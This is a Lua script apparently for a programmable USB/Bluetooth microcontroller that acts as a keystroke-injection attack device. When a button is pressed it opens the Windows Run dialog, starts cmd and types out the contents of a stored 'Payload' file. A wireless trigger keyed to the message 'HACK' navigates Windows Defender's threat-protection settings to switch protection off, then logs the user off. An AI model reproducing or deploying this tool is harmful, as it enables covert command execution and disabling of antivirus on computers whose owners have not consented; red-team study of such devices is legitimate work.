LIB_UsbConfig("KBD")
LIB_ButtonConfig("BTN1","D10","L")
LIB_ButtonConfig("BTN2","D11","L")

PAYLOAD = "Payload"
BLECONFIG = "BLE"
BLENAME = "BLEName"
PASSCODE = "Passcode"

-- "HACK" is the message and code to trigger action
HEARTBEAT = {72,65,67,75}

blename = "LCHB"
passcode = ""

done = true
capslock = false
wireless = false
checkpass = false

--[[ Reserved for use with dynamic binary conversion to payload, implementation code commented out to reduce program size in order to squeeze in the main memory size limit.

function hex(t)
  local s = ""
  for _, v in ipairs(t) do
    s = s.."\\x"..(string.format("%02x", v))
  end
  s=s:gsub("\\x(%x%x)",function (x) return string.char(tonumber(x,16)) end)
  return s
end
--]]

--[[ Reserved for use with dynamic binary conversion to payload, implementation code commented out to reduce program size in order to squeeze in the main memory size limit.

function base64(data)
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  return ((data:gsub('.', function(x)
      local r,b='',x:byte()
      for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
      return r;
  end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
      if (#x < 6) then return '' end
      local c=0
      for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
      return b:sub(c+1,c+1)
  end)..({ '', '==', '=' })[#data%3+1])
end
--]]

function utf8(t)
  local bytearr = {}
  for _, v in ipairs(t) do
    local utf8byte = v < 0 and (0xff + v + 1) or v
    table.insert(bytearr, string.char(utf8byte))
  end
  return bytearr
end

function shiftChar(c)
  local shiftset = {
    [33] = "1",
    [34] = "QUOTE",
    [35] = "3",
    [36] = "4",
    [37] = "5",
    [38] = "7",
    [40] = "9",
    [41] = "0",
    [42] = "8",
    [43] = "PLUS",
    [58] = "COLON",
    [60] = "COMMA",
    [62] = "DOT",
    [63] = "SLASH",
    [64] = "2",
    [94] = "6",
    [95] = "UNDERSCORE",
    [123] = "OPEN_BRACKET",
    [124] = "BACKSLASH",
    [125] = "CLOSE_BRACKET",
    [126] = "TILDE"
  }

  if shiftset[c] ~= nil then
    return {"SHIFT", shiftset[c]}
  end

  return nil
end

function translateChar(c, t)
  local charset = {
    [9] = "TAB",
    [10] = "ENTER",
    -- ignore carriage return
    -- [13] = "ENTER",
    [32] = "SPACEBAR",
    [39] = "QUOTE",
    [44] = "COMMA",
    [45] = "UNDERSCORE",
    [46] = "DOT",
    [47] = "SLASH",
    [59] = "COLON",
    [61] = "PLUS",
    [91] = "OPEN_BRACKET",
    [92] = "BACKSLASH",
    [93] = "CLOSE_BRACKET",
    [96] = "TILDE"
  }

  if c >= 48 and c <= 57 then
    table.insert(t, string.char(c))
    return t
  end

  if c >= 65 and c <= 90 then
    if not capslock then
      table.insert(t, "CAPS_LOCK")
      capslock = true
    end
    table.insert(t, string.char(c))
    return t
  end

  if c >= 97 and c <= 122 then
    if capslock then
      table.insert(t, "CAPS_LOCK")
      capslock = false
    end
    table.insert(t, string.char(c-32))
    return t
  end

  if capslock then
    table.insert(t, "CAPS_LOCK")
    capslock = false
  end

  if charset[c] ~= nil then
    table.insert(t, charset[c])
  end

  return t
end

function switchCase(case)
  klock, nlock = LIB_UsbKbdCapsLockAndNumLockQuery()
  if klock ~= case then
    LIB_UsbKbdSend("SINGLE", {"CAPS_LOCK"})
  end
  capslock = (case == 1 and true or false)
end

function cmdline()
  LIB_UsbKbdSend("COMBINE", {"GUI", "R"})
  LIB_DelayMs(1000)
  LIB_UsbKbdSend("SINGLE", {"C", "M", "D", "ENTER"})
  LIB_DelayMs(1000)
end

function exitcmd()
  LIB_DelayMs(1000)
  LIB_UsbKbdSend("SINGLE", {"E", "X", "I", "T", "ENTER"})
end

function offDefender()
  LIB_UsbKbdSend("COMBINE", {"GUI", "R"})
  LIB_DelayMs(1000)
  LIB_UsbKbdSend("SINGLE", {"W", "I", "N", "D", "O", "W", "S", "D", "E", "F", "E", "N", "D", "E", "R"})
  LIB_UsbKbdSend("COMBINE", {"SHIFT", "COLON"})
  LIB_UsbKbdSend("SINGLE", {"SLASH", "SLASH", "T", "H", "R", "E", "A", "T", "ENTER"})
  LIB_DelayMs(5000)
  LIB_UsbKbdSend("SINGLE", {"TAB", "TAB", "TAB", "TAB", "ENTER"})
  LIB_DelayMs(1000)
  LIB_UsbKbdSend("SINGLE", {"SPACEBAR"})
  LIB_DelayMs(1000)
  LIB_UsbKbdSend("SINGLE", {"TAB", "TAB", "ENTER"})
  LIB_DelayMs(1000)
end

function logoff()
  cmdline()
  LIB_UsbKbdSend("SINGLE", {"S", "H", "U", "T", "D", "O", "W", "N", "SPACEBAR", "SLASH", "L", "ENTER"})
end

--[[ Reserved for use with BLE configuration using config file, implementation code commented out to reduce program size in order to squeeze in the main memory size limit.

function readlines(file)
  local lines = {}
  local line = {}
  local n, data = LIB_Fread(file, 0)
  if n > 0 then
    for _, v in ipairs(data) do
      if string.char(v) ~= "\n" then
        if string.char(v) ~= " " and string.char(v) ~= "\t" and string.char(v) ~= "\r" then
          table.insert(line, string.char(v))
        end
      else
        if not rawequal(next(line), nil) then
          table.insert(lines, table.concat(line))
          line = {}
        end
      end
    end
    if not rawequal(next(line), nil) then
      table.insert(lines, table.concat(line))
    end
  end
  return lines
end
--]]

--[[ Reserved for use with BLE configuration using config file, implementation code commented out to reduce program size in order to squeeze in the main memory size limit.

function parseKV(lines)
  local kv = {}
  for _, line in ipairs(lines) do
    for k, v in string.gmatch(line, "(%w+)=(%w+)") do
      kv[k] = v
    end
  end
  return kv
end
--]]

function init()
  switchCase(0)

--[[ Reserved for use with BLE configuration using config file, implementation code commented out to reduce program size in order to squeeze in the main memory size limit.

  lines = readlines(BLECONFIG)
  kv = parseKV(lines)
  if kv[BLENAME] ~= nil then
    blename = kv[BLENAME]
  end

  if kv[PASSCODE] ~= nil then
    passcode = kv[PASSCODE]
  end
--]]

  LIB_NrfBleDefaultConfig(blename)
end

init()

while(GC(1) == true) do
    if LIB_ButtonQuery("BTN1") == 1 then
      done = false
    end

    if not done then
      LIB_DelayMs(1000)
      switchCase(0)
      cmdline()
      i = 0
      repeat
        -- size limit of 256 bytes returned by LIB_Fread API
        n, data = LIB_Fread(PAYLOAD, i*256)
        if n > 0 then
          j = 1
          t = {}
          for _, v in ipairs(utf8(data)) do
            -- use SHIFT combination for special characters
            tt = shiftChar(string.byte(v))
            if tt ~= nil then
              if #t > 0 then
                LIB_UsbKbdSend("SINGLE", t)
                j = 1
                t = {}
              end
              -- no effect in curret logic
              -- safety switch for sending capital letters with SHIFT key
              switchCase(0)
              LIB_UsbKbdSend("COMBINE", tt)
              goto continue
            end
            -- reserve 128 bytes (256/2) for caps lock key insertion
            if j % 128 == 0 then
              LIB_UsbKbdSend("SINGLE", t)
              j = 1
              t = {}
            end
            -- construct key table with caps lock for upper case characters
            -- instead of sending SHIFT key for each character in loop
            -- in order to reduce number of calls
            t = translateChar(string.byte(v), t)
            j = j + 1
            -- allow time for execution
            if string.byte(v) == 10 or string.byte(v) == 13 then
              LIB_UsbKbdSend("SINGLE", t)
              j = 1
              t = {}
              LIB_DelayMs(1000)
            end
            ::continue::
          end
          LIB_UsbKbdSend("SINGLE", t)
          if n < 256 then
            break
          end
          i = i + 1
        end
      until(n == 0)
      exitcmd()
      done = true
      -- reset the system to work around a firmware bug
      LIB_SystemReset()
    end

    if LIB_ButtonQuery("BTN2") == 1 then
      wireless = true
    end

    if wireless then
      LIB_DelayMs(1000)
      if checkpass or passcode == "" then
        stable = HEARTBEAT
        LIB_NrfBleSend(stable)
        rflag, rtable = LIB_NrfBleRecv()
        if rflag == 1 then
          if table.concat(rtable) == table.concat(HEARTBEAT) then
            offDefender()
            logoff()
            -- reset the system to work around a firmware bug
            LIB_SystemReset()
          end
        end
      else
        rflag, rtable = LIB_NrfBleRecv()
        if rflag == 1 then
          if table.concat(rtable) == passcode then
            checkpass = true
          end
        end
      end
    end
end
